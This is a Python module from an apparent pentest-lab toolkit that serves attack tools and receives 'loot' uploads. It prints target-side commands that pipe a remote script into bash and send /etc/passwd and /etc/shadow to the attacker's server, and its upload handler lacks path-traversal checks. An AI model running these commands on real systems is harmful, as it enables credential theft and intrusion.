#!/usr/bin/env python3
"""
http_server.py - HTTP server for serving files and receiving uploads
Context-aware version - serves from current lab
"""

import os
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs, unquote, urlparse
from pathlib import Path
import subprocess
from datetime import datetime

from ..config import Colors
from ..core.context import find_lab_root


def get_server_paths():
    """
    Get paths based on lab context
    
    Returns:
        tuple: (serve_dir, loot_dir, log_file)
    """
    lab_root = find_lab_root()
    serve_dir = lab_root / "server" / "serve"
    loot_dir = lab_root / "server" / "loot"
    log_file = lab_root / "labcmdr" / "httpserver.log"
    
    return serve_dir, loot_dir, log_file


def get_tun0_ip():
    """
    Get the IPv4 address of tun0 interface
    
    Returns:
        str: IP address or None if not found
    """
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", "tun0"],
            capture_output=True,
            text=True,
            check=True
        )
        for line in result.stdout.split('\n'):
            if 'inet ' in line:
                ip = line.strip().split()[1].split('/')[0]
                return ip
    except (subprocess.CalledProcessError, IndexError, FileNotFoundError):
        pass
    
    return None


def check_port_available(port):
    """
    Check if a port is available for binding
    
    Args:
        port: Port number to check
    
    Returns:
        bool: True if available, False if in use
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    
    try:
        # Try to bind to the port
        sock.bind(('', port))
        sock.close()
        return True
    except OSError:
        sock.close()
        return False

class DualHTTPRequestHandler(SimpleHTTPRequestHandler):
    """
    Custom HTTP handler that:
    - Serves files from serve_base directory (GET)
    - Accepts uploads to loot_base directory (POST)
    """
    serve_base = None
    loot_base = None
    log_file = None
    
    def log_to_file(self, message):
        """Write log message to file and console"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        # Write to file
        if self.log_file:
            try:
                with open(self.log_file, 'a') as f:
                    f.write(log_entry)
            except:
                pass
        
        # Print to console
        print(log_entry.strip())
    
    def translate_path(self, path):
        """
        Translate URL path to filesystem path within serve_base.
        This overrides the parent method to use our custom serve directory
        instead of relying on os.getcwd().
        """
        # Remove query string and fragment
        path = path.split('?', 1)[0]
        path = path.split('#', 1)[0]
        
        # Decode percent-encoded characters
        path = unquote(path)
        
        # Remove leading slash
        if path.startswith('/'):
            path = path[1:]
        
        # Prevent directory traversal attacks
        path = path.replace('..', '')
        
        # Join with serve_base directory
        full_path = self.serve_base / path
        
        # If path is a directory, look for index.html
        if full_path.is_dir():
            index_path = full_path / 'index.html'
            if index_path.exists():
                full_path = index_path
        
        return str(full_path)
    
    def do_GET(self):
        """Serve files from serve_base directory"""
        # Parse the path
        parsed_path = urlparse(self.path)
        clean_path = unquote(parsed_path.path)
        
        # Log the request
        client_ip = self.client_address[0]
        self.log_to_file(f"{Colors.CYAN}[GET]{Colors.NC} {client_ip} → {clean_path}")
        
        # Serve the file using parent class (which will call our translate_path)
        return SimpleHTTPRequestHandler.do_GET(self)
    
    def do_POST(self):
        """Handle file uploads to loot_base directory"""
        client_ip = self.client_address[0]
        
        try:
            # Parse the upload path from URL
            parsed_path = urlparse(self.path)
            upload_path = unquote(parsed_path.path)
            
            # Remove leading /upload/ if present
            if upload_path.startswith('/upload/'):
                upload_path = upload_path[8:]  # Remove '/upload/'
            elif upload_path.startswith('/'):
                upload_path = upload_path[1:]
            
            # If no path specified, default to root of loot
            if not upload_path:
                upload_path = f"upload_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Build full destination path
            dest_path = self.loot_base / upload_path
            
            # Create parent directories if needed
            dest_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Get content length
            content_length = int(self.headers.get('Content-Length', 0))
            
            # Read the uploaded data
            upload_data = self.rfile.read(content_length)
            
            # Write to file
            with open(dest_path, 'wb') as f:
                f.write(upload_data)
            
            # Log success
            size_kb = len(upload_data) / 1024
            self.log_to_file(
                f"{Colors.GREEN}[UPLOAD]{Colors.NC} {client_ip} → {upload_path} "
                f"({size_kb:.1f} KB)"
            )
            
            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Upload successful\n')
            
        except Exception as e:
            # Log error
            self.log_to_file(f"{Colors.RED}[ERROR]{Colors.NC} Upload failed: {e}")
            
            # Send error response
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(f'Upload failed: {e}\n'.encode())
    
    def log_message(self, format, *args):
        """Override to suppress default logging (we handle it in log_to_file)"""
        pass

def display_commands(ip, port, serve_dir, loot_dir):
    """
    Display helpful commands for downloading/uploading files
    
    Args:
        ip: Server IP address
        port: Server port
        serve_dir: Directory being served
        loot_dir: Directory for uploads
    """
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.CYAN}║                    Target Commands                               ║{Colors.NC}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════════╝{Colors.NC}\n")
    
    print(f"{Colors.YELLOW}Download files (from target):{Colors.NC}")
    print(f"  wget http://{ip}:{port}/tools/linpeas.sh")
    print(f"  curl -O http://{ip}:{port}/tools/linpeas.sh")
    print(f"  curl http://{ip}:{port}/tools/linpeas.sh | bash")
    
    print(f"\n{Colors.YELLOW}Upload files (from target):{Colors.NC}")
    print(f"  curl -X POST -F 'file=@/etc/passwd' http://{ip}:{port}/upload/creds/passwd")
    print(f"  curl -d @/etc/shadow http://{ip}:{port}/upload/hashes/shadow")
    
    print(f"\n{Colors.YELLOW}Windows (PowerShell):{Colors.NC}")
    print(f"  IWR -Uri http://{ip}:{port}/tools/winpeas.exe -OutFile winpeas.exe")
    print(f"  (New-Object Net.WebClient).DownloadFile('http://{ip}:{port}/tools/nc.exe','nc.exe')")
    
    print(f"\n{Colors.YELLOW}Alternative transfer methods:{Colors.NC}")
    print(f"  # Netcat (if available)")
    print(f"  nc {ip} {port} < file.txt")
    
    print(f"\n{Colors.GREEN}Directories:{Colors.NC}")
    print(f"  Serving:  {serve_dir}")
    print(f"  Uploads:  {loot_dir}")
    print()


def start_server(port=8080):
    """
    Start HTTP server for current lab
    
    Args:
        port: Port to run server on
    
    Returns:
        HTTPServer instance (or None if failed)
    """
    # Get paths from current lab
    serve_dir, loot_dir, log_file = get_server_paths()
    
    # Create directories if they don't exist
    serve_dir.mkdir(parents=True, exist_ok=True)
    loot_dir.mkdir(parents=True, exist_ok=True)
    
    # Create subdirectories
    (serve_dir / 'tools').mkdir(exist_ok=True)
    (serve_dir / 'exploits').mkdir(exist_ok=True)
    (serve_dir / 'payloads').mkdir(exist_ok=True)
    
    (loot_dir / 'creds').mkdir(exist_ok=True)
    (loot_dir / 'hashes').mkdir(exist_ok=True)
    (loot_dir / 'interesting_files').mkdir(exist_ok=True)
    (loot_dir / 'screenshots').mkdir(exist_ok=True)
    
    # Create/open log file
    log_file.parent.mkdir(parents=True, exist_ok=True)
    with open(log_file, 'a') as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"Server started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Port: {port}\n")
        f.write(f"{'='*60}\n")
    
    # Get tun0 IP
    ip = get_tun0_ip()
    if not ip:
        print(f"{Colors.RED}[!] Could not find tun0 IP. Is your VPN connected?{Colors.NC}")
        return None
    
    print(f"{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║     Lab Server - Serve & Upload          ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Set paths for handler
    DualHTTPRequestHandler.serve_base = serve_dir
    DualHTTPRequestHandler.loot_base = loot_dir
    DualHTTPRequestHandler.log_file = log_file
    
    # Start server
    server_address = (ip, port)
    httpd = HTTPServer(server_address, DualHTTPRequestHandler)
    
    print(f"{Colors.YELLOW}╔══════════════════════════════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.YELLOW}║  Server running on: http://{ip}:{port}{' ' * (46 - len(str(port)) - len(ip))}║{Colors.NC}")
    print(f"{Colors.YELLOW}║  Log file: {str(log_file):<53}║{Colors.NC}")
    print(f"{Colors.YELLOW}╚══════════════════════════════════════════════════════════════════╝{Colors.NC}\n")
    
    display_commands(ip, port, serve_dir, loot_dir)
    
    return httpd